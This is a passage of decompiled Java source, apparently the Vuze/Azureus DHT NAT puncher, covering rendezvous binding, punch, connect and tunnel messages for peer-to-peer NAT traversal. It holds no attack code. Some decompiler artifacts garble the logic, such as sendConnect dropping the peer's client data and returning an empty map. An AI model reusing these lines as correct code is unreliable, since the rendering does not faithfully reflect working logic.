/* 1036 */           this.rendezvous_last_ok_time = now;
/*      */           
/* 1038 */           if (this.last_ok_rendezvous != this.current_target)
/*      */           {
/* 1040 */             this.last_ok_rendezvous = this.current_target;
/*      */             
/* 1042 */             log("Rendezvous " + latest_target.getString() + " operational");
/*      */             
/* 1044 */             for (DHTNATPuncherListener l : this.listeners)
/*      */             {
/* 1046 */               l.rendezvousChanged(this.current_target);
/*      */             }
/*      */           }
/*      */         }
/*      */         else {
/* 1051 */           this.rendezvous_last_fail_time = now;
/*      */           
/* 1053 */           if (bind_result == 1)
/*      */           {
/*      */ 
/*      */ 
/* 1057 */             this.rendevzous_fail_count = 4;
/*      */           }
/*      */           else
/*      */           {
/* 1061 */             this.rendevzous_fail_count += 1;
/*      */           }
/*      */           
/* 1064 */           if (this.rendevzous_fail_count == 4)
/*      */           {
/* 1066 */             rendezvousFailed(this.current_target, false);
/*      */           }
/*      */         }
/*      */       }
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1073 */       log(e);
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void rendezvousFailed(DHTTransportContact current_target, boolean tidy)
/*      */   {
/* 1085 */     log("Rendezvous " + (tidy ? "closed" : "failed") + ": " + current_target.getString());
/*      */     try
/*      */     {
/* 1088 */       this.pub_mon.enter();
/*      */       
/* 1090 */       this.failed_rendezvous.put(current_target.getAddress(), "");
/*      */     }
/*      */     finally
/*      */     {
/* 1094 */       this.pub_mon.exit();
/*      */     }
/*      */     
/* 1097 */     publish(true);
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */   protected byte[] sendRequest(DHTTransportContact target, byte[] data, int timeout)
/*      */   {
/*      */     try
/*      */     {
/* 1107 */       return this.dht.getTransport().writeReadTransfer(null, target, transfer_handler_key, data, timeout);
/*      */     }
/*      */     catch (DHTTransportException e) {}
/*      */     
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/* 1119 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected byte[] receiveRequest(DHTTransportUDPContact originator, byte[] data)
/*      */   {
/*      */     try
/*      */     {
/* 1130 */       Map res = receiveRequest(originator, this.formatters.bDecode(data));
/*      */       
/* 1132 */       if (res == null)
/*      */       {
/* 1134 */         return null;
/*      */       }
/*      */       
/* 1137 */       return this.formatters.bEncode(res);
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1141 */       log(e);
/*      */     }
/* 1143 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected Map sendRequest(DHTTransportContact target, Map data, int timeout)
/*      */   {
/* 1153 */     int type = ((Long)data.get("type")).intValue();
/*      */     
/* 1155 */     if ((type >= 0) && (type < this.MESSAGE_STATS.length))
/*      */     {
/* 1157 */       this.MESSAGE_STATS[type] += 1;
/*      */     }
/*      */     try
/*      */     {
/* 1161 */       byte[] res = sendRequest(target, this.formatters.bEncode(data), timeout);
/*      */       
/* 1163 */       if (res == null)
/*      */       {
/* 1165 */         return null;
/*      */       }
/*      */       
/* 1168 */       return this.formatters.bDecode(res);
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1172 */       log(e);
/*      */     }
/* 1174 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected Map receiveRequest(DHTTransportUDPContact originator, Map data)
/*      */   {
/* 1183 */     int type = ((Long)data.get("type")).intValue();
/*      */     
/* 1185 */     if ((type >= 0) && (type < this.MESSAGE_STATS.length))
/*      */     {
/* 1187 */       this.MESSAGE_STATS[type] += 1;
/*      */     }
/*      */     
/* 1190 */     Map response = new HashMap();
/*      */     
/* 1192 */     switch (type)
/*      */     {
/*      */ 
/*      */     case 0: 
/* 1196 */       response.put("type", new Long(1L));
/*      */       
/* 1198 */       receiveBind(originator, data, response);
/*      */       
/* 1200 */       break;
/*      */     
/*      */ 
/*      */     case 10: 
/* 1204 */       response.put("type", new Long(11L));
/*      */       
/* 1206 */       receiveClose(originator, data, response);
/*      */       
/* 1208 */       break;
/*      */     
/*      */ 
/*      */     case 8: 
/* 1212 */       response.put("type", new Long(9L));
/*      */       
/* 1214 */       receiveQuery(originator, data, response);
/*      */       
/* 1216 */       break;
/*      */     
/*      */ 
/*      */     case 2: 
/* 1220 */       response.put("type", new Long(3L));
/*      */       
/* 1222 */       receivePunch(originator, data, response);
/*      */       
/* 1224 */       break;
/*      */     
/*      */ 
/*      */     case 4: 
/* 1228 */       response.put("type", new Long(5L));
/*      */       
/* 1230 */       receiveConnect(originator, data, response);
/*      */       
/* 1232 */       break;
/*      */     
/*      */ 
/*      */     case 6: 
/* 1236 */       receiveTunnelInbound(originator, data);
/*      */       
/* 1238 */       response = null;
/*      */       
/* 1240 */       break;
/*      */     
/*      */ 
/*      */     case 7: 
/* 1244 */       receiveTunnelOutbound(originator, data);
/*      */       
/* 1246 */       response = null;
/*      */       
/* 1248 */       break;
/*      */     case 1: case 3: 
/*      */     case 5: case 9: 
/*      */     default: 
/* 1252 */       response = null;
/*      */     }
/*      */     
/*      */     
/*      */ 
/*      */ 
/* 1258 */     Map debug = (Map)data.get("_debug");
/*      */     
/* 1260 */     if (debug != null)
/*      */     {
/* 1262 */       Map out = handleDebug(debug);
/*      */       
/* 1264 */       if (out != null)
/*      */       {
/* 1266 */         response.put("_debug", out);
/*      */       }
/*      */     }
/*      */     
/* 1270 */     return response;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected boolean sendTunnelMessage(DHTTransportContact target, Map data)
/*      */   {
/*      */     try
/*      */     {
/* 1279 */       return sendTunnelMessage(target, this.formatters.bEncode(data));
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1283 */       log(e);
/*      */     }
/* 1285 */     return false;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */   protected boolean sendTunnelMessage(DHTTransportContact target, byte[] data)
/*      */   {
/*      */     try
/*      */     {
/* 1295 */       this.dht.getTransport().writeTransfer(null, target, transfer_handler_key, new byte[0], data, 3000L);
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/* 1303 */       return true;
/*      */     }
/*      */     catch (DHTTransportException e) {}
/*      */     
/*      */ 
/*      */ 
/* 1309 */     return false;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected int sendBind(DHTTransportContact target)
/*      */   {
/*      */     try
/*      */     {
/* 1318 */       Map request = new HashMap();
/*      */       
/* 1320 */       request.put("type", new Long(0L));
/*      */       
/* 1322 */       Map response = sendRequest(target, request, 30000);
/*      */       
/* 1324 */       if (response == null)
/*      */       {
/* 1326 */         return 2;
/*      */       }
/*      */       
/* 1329 */       if (((Long)response.get("type")).intValue() == 1)
/*      */       {
/* 1331 */         int result = ((Long)response.get("ok")).intValue();
/*      */         
/* 1333 */         trace("received bind reply: " + (result == 0 ? "failed" : "ok"));
/*      */         
/* 1335 */         if (result == 1)
/*      */         {
/* 1337 */           return 0;
/*      */         }
/*      */       }
/*      */       
/* 1341 */       return 1;
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1345 */       log(e);
/*      */     }
/* 1347 */     return 2;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void receiveBind(DHTTransportUDPContact originator, Map request, Map response)
/*      */   {
/* 1357 */     trace("received bind request from " + originator.getString());
/*      */     
/* 1359 */     boolean ok = true;
/* 1360 */     boolean log = true;
/*      */     
/* 1362 */     if (this.is_secondary)
/*      */     {
/* 1364 */       ok = false;
/*      */       
/* 1366 */       log("Rendezvous request from " + originator.getString() + " denied as secondary puncher");
/*      */     }
/*      */     else
/*      */     {
/*      */       try {
/* 1371 */         this.server_mon.enter();
/*      */         
/* 1373 */         String key = originator.getAddress().toString();
/*      */         
/* 1375 */         BindingData entry = (BindingData)this.rendezvous_bindings.get(key);
/*      */         
/* 1377 */         if (entry == null)
/*      */         {
/* 1379 */           if (this.rendezvous_bindings.size() == 8)
/*      */           {
/* 1381 */             ok = false;
/*      */           }
/*      */           
/*      */         }
/* 1385 */         else if (entry.isOKToConnect())
/*      */         {
/*      */ 
/*      */ 
/* 1389 */           log = false;
/*      */ 
/*      */         }
/*      */         else
/*      */         {
/*      */ 
/* 1395 */           ok = false;
/*      */         }
/*      */         
/*      */ 
/* 1399 */         if (ok)
/*      */         {
/* 1401 */           long now = SystemTime.getMonotonousTime();
/*      */           
/* 1403 */           if (entry == null)
/*      */           {
/* 1405 */             this.rendezvous_bindings.put(key, new BindingData(originator, now, null));
/*      */           }
/*      */           else
/*      */           {
/* 1409 */             entry.rebind();
/*      */           }
/*      */           
/* 1412 */           response.put("port", new Long(originator.getAddress().getPort()));
/*      */         }
/*      */       }
/*      */       finally {
/* 1416 */         this.server_mon.exit();
/*      */       }
/*      */       
/* 1419 */       if (log)
/*      */       {
/* 1421 */         log("Rendezvous request from " + originator.getString() + " " + (ok ? "accepted" : "denied"));
/*      */       }
/*      */     }
/*      */     
/* 1425 */     response.put("ok", new Long(ok ? 1L : 0L));
/*      */   }
/*      */   
/*      */   public void destroy()
/*      */   {
/*      */     try
/*      */     {
/* 1432 */       this.server_mon.enter();
/*      */       
/* 1434 */       Iterator<BindingData> it = this.rendezvous_bindings.values().iterator();
/*      */       
/* 1436 */       while (it.hasNext())
/*      */       {
/* 1438 */         BindingData entry = (BindingData)it.next();
/*      */         
/* 1440 */         final DHTTransportUDPContact contact = entry.getContact();
/*      */         
/* 1442 */         new AEThread2("DHTNATPuncher:destroy", true)
/*      */         {
/*      */ 
/*      */           public void run()
/*      */           {
/* 1447 */             DHTNATPuncherImpl.this.sendClose(contact);
/*      */           }
/*      */         }.start();
/*      */       }
/*      */       
/* 1452 */       byte[] lpk = this.last_publish_key;
/* 1453 */       List<DHTTransportContact> lws = this.last_write_set;
/*      */       
/* 1455 */       if ((lpk != null) && (lws != null))
/*      */       {
/* 1457 */         log("Removing publish on closedown");
/*      */         
/* 1459 */         DHTTransportContact[] contacts = (DHTTransportContact[])lws.toArray(new DHTTransportContact[lws.size()]);
/*      */         
/* 1461 */         this.dht.remove(contacts, lpk, "NAT Puncher destroy", new DHTOperationAdapter());
/*      */ 
/*      */       }
/*      */       
/*      */ 
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/*      */ 
/* 1470 */       log(e);
/*      */     }
/*      */     finally
/*      */     {
/* 1474 */       this.server_mon.exit();
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */   protected int sendClose(DHTTransportContact target)
/*      */   {
/*      */     try
/*      */     {
/* 1483 */       Map request = new HashMap();
/*      */       
/* 1485 */       request.put("type", new Long(10L));
/*      */       
/* 1487 */       Map response = sendRequest(target, request, 30000);
/*      */       
/* 1489 */       if (response == null)
/*      */       {
/* 1491 */         return 2;
/*      */       }
/*      */       
/* 1494 */       if (((Long)response.get("type")).intValue() == 11)
/*      */       {
/* 1496 */         int result = ((Long)response.get("ok")).intValue();
/*      */         
/* 1498 */         trace("received close reply: " + (result == 0 ? "failed" : "ok"));
/*      */         
/* 1500 */         if (result == 1)
/*      */         {
/* 1502 */           return 0;
/*      */         }
/*      */       }
/*      */       
/* 1506 */       return 1;
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1510 */       log(e);
/*      */     }
/* 1512 */     return 2;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void receiveClose(DHTTransportUDPContact originator, Map request, Map response)
/*      */   {
/* 1522 */     trace("received close request");
/*      */     
/* 1524 */     final DHTTransportContact current_target = this.rendezvous_target;
/*      */     
/* 1526 */     if ((current_target != null) && (Arrays.equals(current_target.getID(), originator.getID())))
/*      */     {
/* 1528 */       new AEThread2("DHTNATPuncher:close", true)
/*      */       {
/*      */ 
/*      */         public void run()
/*      */         {
/* 1533 */           DHTNATPuncherImpl.this.rendezvousFailed(current_target, true);
/*      */         }
/*      */       }.start();
/*      */     }
/*      */     
/* 1538 */     response.put("ok", new Long(1L));
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   private int sendQuery(DHTTransportContact target)
/*      */   {
/*      */     try
/*      */     {
/* 1551 */       Map request = new HashMap();
/*      */       
/* 1553 */       request.put("type", new Long(8L));
/*      */       
/* 1555 */       Map response = sendRequest(target, request, 30000);
/*      */       
/* 1557 */       if (response == null)
/*      */       {
/* 1559 */         return 2;
/*      */       }
/*      */       
/* 1562 */       if (((Long)response.get("type")).intValue() == 9)
/*      */       {
/* 1564 */         int result = ((Long)response.get("ok")).intValue();
/*      */         
/* 1566 */         trace("received query reply: " + (result == 0 ? "failed" : "ok"));
/*      */         
/* 1568 */         if (result == 1)
/*      */         {
/* 1570 */           return 0;
/*      */         }
/*      */       }
/*      */       
/* 1574 */       return 1;
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1578 */       log(e);
/*      */     }
/* 1580 */     return 2;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void receiveQuery(DHTTransportUDPContact originator, Map request, Map response)
/*      */   {
/* 1590 */     trace("received query request");
/*      */     
/* 1592 */     InetSocketAddress address = originator.getTransportAddress();
/*      */     
/* 1594 */     response.put("ip", address.getAddress().getHostAddress().getBytes());
/*      */     
/* 1596 */     response.put("port", new Long(address.getPort()));
/*      */     
/* 1598 */     response.put("ok", new Long(1L));
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected Map sendPunch(DHTTransportContact rendezvous, final DHTTransportUDPContact target, Map originator_client_data, boolean no_tunnel)
/*      */   {
/* 1608 */     AESemaphore wait_sem = new AESemaphore("DHTNatPuncher::sendPunch");
/* 1609 */     Object[] wait_data = { target, wait_sem, new Integer(0) };
/*      */     try
/*      */     {
/*      */       try
/*      */       {
/* 1614 */         this.punch_mon.enter();
/*      */         
/* 1616 */         this.oustanding_punches.add(wait_data);
/*      */       }
/*      */       finally
/*      */       {
/* 1620 */         this.punch_mon.exit();
/*      */       }
/*      */       
/* 1623 */       Object request = new HashMap();
/*      */       
/* 1625 */       ((Map)request).put("type", new Long(2L));
/*      */       
/* 1627 */       ((Map)request).put("target", target.getAddress().toString().getBytes());
/*      */       
/* 1629 */       if (originator_client_data != null)
/*      */       {
/* 1631 */         if (no_tunnel)
/*      */         {
/* 1633 */           originator_client_data.put("_notunnel", new Long(1L));
/*      */         }
/*      */         
/* 1636 */         ((Map)request).put("client_data", originator_client_data);
/*      */       }
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/* 1643 */       response = sendRequest(rendezvous, (Map)request, no_tunnel ? 60000 : 30000);
/*      */       
/* 1645 */       if (response == null)
/*      */       {
/* 1647 */         return null;
/*      */       }
/*      */       int result;
/* 1650 */       if (((Long)response.get("type")).intValue() == 3)
/*      */       {
/* 1652 */         result = ((Long)response.get("ok")).intValue();
/*      */         
/* 1654 */         trace("received " + (no_tunnel ? "message" : "punch") + " reply: " + (result == 0 ? "failed" : "ok"));
/*      */         
/* 1656 */         if (result == 1)
/*      */         {
/*      */ 
/*      */ 
/* 1660 */           Long indirect_port = (Long)response.get("port");
/*      */           
/* 1662 */           if (indirect_port != null)
/*      */           {
/* 1664 */             int transport_port = indirect_port.intValue();
/*      */             
/* 1666 */             if (transport_port != 0)
/*      */             {
/* 1668 */               InetSocketAddress existing_address = target.getTransportAddress();
/*      */               
/* 1670 */               if (transport_port != existing_address.getPort())
/*      */               {
/* 1672 */                 target.setTransportAddress(new InetSocketAddress(existing_address.getAddress(), transport_port));
/*      */               }
/*      */             }
/*      */           }
/*      */           
/*      */ 
/* 1678 */           if (!no_tunnel)
/*      */           {
/*      */ 
/*      */ 
/* 1682 */             UTTimerEvent event = this.timer.addPeriodicEvent(3000L, new UTTimerEventPerformer()
/*      */             {
/*      */ 
/*      */ 
/*      */ 
/* 1687 */               private int pings = 1;
/*      */               
/*      */ 
/*      */ 
/*      */               public void perform(UTTimerEvent event)
/*      */               {
/* 1693 */                 if (this.pings > 3)
/*      */                 {
/* 1695 */                   event.cancel();
/*      */                   
/* 1697 */                   return;
/*      */                 }
/*      */                 
/* 1700 */                 this.pings += 1;
/*      */                 
/* 1702 */                 if (DHTNATPuncherImpl.this.sendTunnelOutbound(target))
/*      */                 {
/* 1704 */                   event.cancel();
/*      */                 }
/*      */               }
/*      */             });
/*      */             
/* 1709 */             if (sendTunnelOutbound(target))
/*      */             {
/* 1711 */               event.cancel();
/*      */             }
/*      */             
/*      */ 
/*      */ 
/* 1716 */             if (wait_sem.reserve(10000L))
/*      */             {
/* 1718 */               event.cancel();
/*      */             }
/*      */           }
/*      */           
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/* 1727 */           int transport_port = 0;
/*      */           try
/*      */           {
/* 1730 */             this.punch_mon.enter();
/*      */             
/* 1732 */             transport_port = ((Integer)wait_data[2]).intValue();
/*      */           }
/*      */           finally
/*      */           {
/* 1736 */             this.punch_mon.exit();
/*      */           }
/*      */           
/* 1739 */           if (transport_port != 0)
/*      */           {
/* 1741 */             InetSocketAddress existing_address = target.getTransportAddress();
/*      */             
/* 1743 */             if (transport_port != existing_address.getPort())
/*      */             {
/* 1745 */               target.setTransportAddress(new InetSocketAddress(existing_address.getAddress(), transport_port));
/*      */             }
/*      */           }
/*      */           
/*      */ 
/* 1750 */           Map target_client_data = (Map)response.get("client_data");
/*      */           
/* 1752 */           if (target_client_data == null)
/*      */           {
/* 1754 */             target_client_data = new HashMap();
/*      */           }
/*      */           
/* 1757 */           return target_client_data;
/*      */         }
/*      */       }
/*      */       
/* 1761 */       return null;
/*      */     }
/*      */     catch (Throwable e) {
/*      */       Map response;
/* 1765 */       log(e);
/*      */       
/* 1767 */       return null;
/*      */     }
/*      */     finally
/*      */     {
/*      */       try {
/* 1772 */         this.punch_mon.enter();
/*      */         
/* 1774 */         this.oustanding_punches.remove(wait_data);
/*      */       }
/*      */       finally
/*      */       {
/* 1778 */         this.punch_mon.exit();
/*      */       }
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void receivePunch(DHTTransportUDPContact originator, Map request, Map response)
/*      */   {
/* 1789 */     trace("received punch request");
/*      */     
/* 1791 */     boolean ok = false;
/*      */     
/* 1793 */     String target_str = new String((byte[])request.get("target"));
/*      */     
/*      */     BindingData entry;
/*      */     try
/*      */     {
/* 1798 */       this.server_mon.enter();
/*      */       
/* 1800 */       entry = (BindingData)this.rendezvous_bindings.get(target_str);
/*      */     }
/*      */     finally
/*      */     {
/* 1804 */       this.server_mon.exit();
/*      */     }
/*      */     
/* 1807 */     String extra_log = "";
/*      */     
/* 1809 */     if (entry != null)
/*      */     {
/* 1811 */       if (entry.isOKToConnect())
/*      */       {
/* 1813 */         DHTTransportUDPContact target = entry.getContact();
/*      */         
/* 1815 */         Map target_client_data = sendConnect(target, originator, (Map)request.get("client_data"));
/*      */         
/* 1817 */         if (target_client_data != null)
/*      */         {
/* 1819 */           response.put("client_data", target_client_data);
/*      */           
/* 1821 */           response.put("port", new Long(target.getTransportAddress().getPort()));
/*      */           
/* 1823 */           ok = true;
/*      */           
/* 1825 */           entry.connectOK();
/*      */         }
/*      */         else
/*      */         {
/* 1829 */           entry.connectFailed();
/*      */           
/* 1831 */           extra_log = " - consec=" + entry.getConsecutiveFailCount();
/*      */         }
/*      */       }
/*      */       else {
/* 1835 */         extra_log = " - ignored due to consec fails";
/*      */       }
/*      */     }
/*      */     else {
/* 1839 */       extra_log = " - invalid rendezvous";
/*      */     }
/*      */     
/* 1842 */     log("Rendezvous punch request from " + originator.getString() + " to " + target_str + " " + (ok ? "initiated" : "failed") + extra_log);
/*      */     
/* 1844 */     if (ok)
/*      */     {
/* 1846 */       this.punch_recv_ok += 1;
/*      */     }
/*      */     else
/*      */     {
/* 1850 */       this.punch_recv_fail += 1;
/*      */     }
/*      */     
/* 1853 */     response.put("ok", new Long(ok ? 1L : 0L));
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */   protected Map sendConnect(DHTTransportContact target, DHTTransportContact originator, Map originator_client_data)
/*      */   {
/*      */     try
/*      */     {
/* 1863 */       Map request = new HashMap();
/*      */       
/* 1865 */       request.put("type", new Long(4L));
/*      */       
/* 1867 */       request.put("origin", encodeContact(originator));
/*      */       
/* 1869 */       request.put("port", new Long(((DHTTransportUDPContact)originator).getTransportAddress().getPort()));
/*      */       
/* 1871 */       if (originator_client_data != null)
/*      */       {
/* 1873 */         request.put("client_data", originator_client_data);
/*      */       }
/*      */       
/* 1876 */       Map response = sendRequest(target, request, 30000);
/*      */       
/* 1878 */       if (response == null)
/*      */       {
/* 1880 */         return null;
/*      */       }
/*      */       
/* 1883 */       if (((Long)response.get("type")).intValue() == 5)
/*      */       {
/* 1885 */         int result = ((Long)response.get("ok")).intValue();
/*      */         
/* 1887 */         trace("received connect reply: " + (result == 0 ? "failed" : "ok"));
/*      */         
/* 1889 */         if (result == 1)
/*      */         {
/* 1891 */           Map target_client_data = (Map)response.get("client_data");
/*      */           
/* 1893 */           if (target_client_data == null) {}
/*      */           
/* 1895 */           return new HashMap();
/*      */         }
/*      */       }
/*      */       
/*      */ 
/*      */ 
/*      */ 
/* 1902 */       return null;
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 1906 */       log(e);
/*      */     }
/* 1908 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void receiveConnect(DHTTransportContact rendezvous, Map request, Map response)
/*      */   {
/* 1918 */     trace("received connect request");
/*      */     
/* 1920 */     boolean ok = false;
/*      */     
/*      */ 
/*      */ 
/* 1924 */     DHTTransportContact rt = this.rendezvous_target;
/*      */     
/* 1926 */     if ((rt != null) && (rt.getAddress().equals(rendezvous.getAddress())))
/*      */     {
/* 1928 */       final DHTTransportUDPContact target = decodeContact((byte[])request.get("origin"));
/*      */       
/* 1930 */       if (target != null)
/*      */       {
/* 1932 */         int transport_port = 0;
/*      */         
/* 1934 */         Long indirect_port = (Long)request.get("port");
/*      */         
/* 1936 */         if (indirect_port != null)
/*      */         {
/* 1938 */           transport_port = indirect_port.intValue();
/*      */         }
/*      */         
/* 1941 */         if (transport_port != 0)
/*      */         {
/* 1943 */           InetSocketAddress existing_address = target.getTransportAddress();
/*      */           
/* 1945 */           if (transport_port != existing_address.getPort())
/*      */           {
/* 1947 */             target.setTransportAddress(new InetSocketAddress(existing_address.getAddress(), transport_port));
/*      */           }
/*      */         }
/*      */         
/*      */ 
/* 1952 */         Map originator_client_data = (Map)request.get("client_data");
/*      */         
/* 1954 */         boolean no_tunnel = false;
/*      */         
/* 1956 */         if (originator_client_data == null)
/*      */         {
/* 1958 */           originator_client_data = new HashMap();
/*      */         }
/*      */         else
/*      */         {
/* 1962 */           no_tunnel = originator_client_data.get("_notunnel") != null;
/*      */         }
/*      */         
/* 1965 */         if (no_tunnel)
/*      */         {
/* 1967 */           log("Received message from " + target.getString());
/*      */         }
/*      */         else
/*      */         {
/* 1971 */           log("Received connect request from " + target.getString());
/*      */           
/*      */ 
/*      */ 
/* 1975 */           UTTimerEvent event = this.timer.addPeriodicEvent(3000L, new UTTimerEventPerformer()
/*      */           {
/*      */ 
/*      */ 
/*      */ 
/* 1980 */             private int pings = 1;
/*      */             
/*      */ 
/*      */ 
/*      */             public void perform(UTTimerEvent ev)
/*      */             {
/* 1986 */               if (this.pings > 3)
/*      */               {
/* 1988 */                 ev.cancel();
/*      */                 
/* 1990 */                 return;
/*      */               }
/*      */               
/* 1993 */               this.pings += 1;
/*      */               
/* 1995 */               if (DHTNATPuncherImpl.this.sendTunnelInbound(target))
/*      */               {
/* 1997 */                 ev.cancel();
/*      */               }
/*      */             }
/*      */           });
/*      */           
/* 2002 */           if (sendTunnelInbound(target))
/*      */           {
/* 2004 */             event.cancel();
/*      */           }
/*      */         }
/*      */         
/* 2008 */         Map client_data = this.adapter.getClientData(target.getTransportAddress(), originator_client_data);
/*      */         
/* 2010 */         if (client_data == null)
/*      */         {
/* 2012 */           client_data = new HashMap();
/*      */         }
/*      */         
/* 2015 */         response.put("client_data", client_data);
/*      */         
/* 2017 */         ok = true;
/*      */       }
/*      */       else
/*      */       {
/* 2021 */         log("Connect request: failed to decode target");
/*      */       }
/*      */     }
/*      */     else {
/* 2025 */       log("Connect request from invalid rendezvous: " + rendezvous.getString());
/*      */     }
/*      */     
/* 2028 */     response.put("ok", new Long(ok ? 1L : 0L));
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected boolean sendTunnelInbound(DHTTransportContact target)
/*      */   {
/* 2035 */     log("Sending tunnel inbound message to " + target.getString());
/*      */     try
/*      */     {
/* 2038 */       Map message = new HashMap();
/*      */       
/* 2040 */       message.put("type", new Long(6L));
/*      */       
/* 2042 */       return sendTunnelMessage(target, message);
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 2046 */       log(e);
/*      */     }
/* 2048 */     return false;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void receiveTunnelInbound(DHTTransportUDPContact originator, Map data)
/*      */   {
/* 2057 */     log("Received tunnel inbound message from " + originator.getString());
/*      */     try
/*      */     {
/* 2060 */       this.punch_mon.enter();
/*      */       
/* 2062 */       for (int i = 0; i < this.oustanding_punches.size(); i++)
/*      */       {
/* 2064 */         Object[] wait_data = (Object[])this.oustanding_punches.get(i);
/*      */         
/* 2066 */         DHTTransportContact wait_contact = (DHTTransportContact)wait_data[0];
/*      */         
/* 2068 */         if (originator.getAddress().getAddress().equals(wait_contact.getAddress().getAddress()))
/*      */         {
/* 2070 */           wait_data[2] = new Integer(originator.getTransportAddress().getPort());
/*      */           
/* 2072 */           ((AESemaphore)wait_data[1]).release();
/*      */         }
/*      */       }
/*      */     }
/*      */     finally
/*      */     {
/* 2078 */       this.punch_mon.exit();
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected boolean sendTunnelOutbound(DHTTransportContact target)
/*      */   {
/* 2086 */     log("Sending tunnel outbound message to " + target.getString());
/*      */     try
/*      */     {
/* 2089 */       Map message = new HashMap();
/*      */       
/* 2091 */       message.put("type", new Long(7L));
/*      */       
/* 2093 */       return sendTunnelMessage(target, message);
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 2097 */       log(e);
/*      */     }
/* 2099 */     return false;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   protected void receiveTunnelOutbound(DHTTransportContact originator, Map data)
/*      */   {
/* 2108 */     log("Received tunnel outbound message from " + originator.getString());
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   public Map punch(String reason, InetSocketAddress[] target, DHTTransportContact[] rendezvous_used, Map originator_client_data)
/*      */   {
/*      */     try
/*      */     {
/* 2119 */       DHTTransportUDP transport = (DHTTransportUDP)this.dht.getTransport();
/*      */       
/* 2121 */       DHTTransportUDPContact contact = transport.importContact(target[0], transport.getMinimumProtocolVersion(), false);
/*      */       
/* 2123 */       Map result = punch(reason, contact, rendezvous_used, originator_client_data);
/*      */       
/* 2125 */       target[0] = contact.getTransportAddress();
/*      */       
/* 2127 */       return result;
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 2131 */       Debug.printStackTrace(e);
/*      */     }
/* 2133 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   public Map punch(String reason, DHTTransportContact _target, DHTTransportContact[] rendezvous_used, Map originator_client_data)
/*      */   {
/* 2144 */     DHTTransportUDPContact target = (DHTTransportUDPContact)_target;
/*      */     try
/*      */     {
/* 2147 */       DHTTransportContact rendezvous = null;
/*      */       
/* 2149 */       if ((rendezvous_used != null) && (rendezvous_used.length > 0))
/*      */       {
/* 2151 */         rendezvous = rendezvous_used[0];
/*      */       }
/*      */       
/* 2154 */       if (rendezvous == null)
/*      */       {
/* 2156 */         rendezvous = getRendezvous(reason, target);
/*      */       }
/*      */       
/* 2159 */       if ((rendezvous_used != null) && (rendezvous_used.length > 0))
/*      */       {
/* 2161 */         rendezvous_used[0] = rendezvous;
/*      */       }
/*      */       
/* 2164 */       if (rendezvous == null)
/*      */       {
/* 2166 */         return null;
/*      */       }
/*      */       
/* 2169 */       Map target_client_data = sendPunch(rendezvous, target, originator_client_data, false);
/*      */       
/* 2171 */       if (target_client_data != null)
/*      */       {
/* 2173 */         log("    punch to " + target.getString() + " succeeded");
/*      */         
/* 2175 */         this.punch_send_ok += 1;
/*      */         
/* 2177 */         return target_client_data;
/*      */       }
/*      */     }
/*      */     catch (Throwable e)
/*      */     {
/* 2182 */       log(e);
/*      */     }
/*      */     
/* 2185 */     this.punch_send_fail += 1;
/*      */     
/* 2187 */     log("    punch to " + target.getString() + " failed");
/*      */     
/* 2189 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */   public Map sendMessage(InetSocketAddress rendezvous, InetSocketAddress target, Map message)
/*      */   {
/*      */     try
/*      */     {
/* 2199 */       DHTTransportUDP transport = (DHTTransportUDP)this.dht.getTransport();
/*      */       
/* 2201 */       DHTTransportUDPContact rend_contact = transport.importContact(rendezvous, transport.getMinimumProtocolVersion(), false);
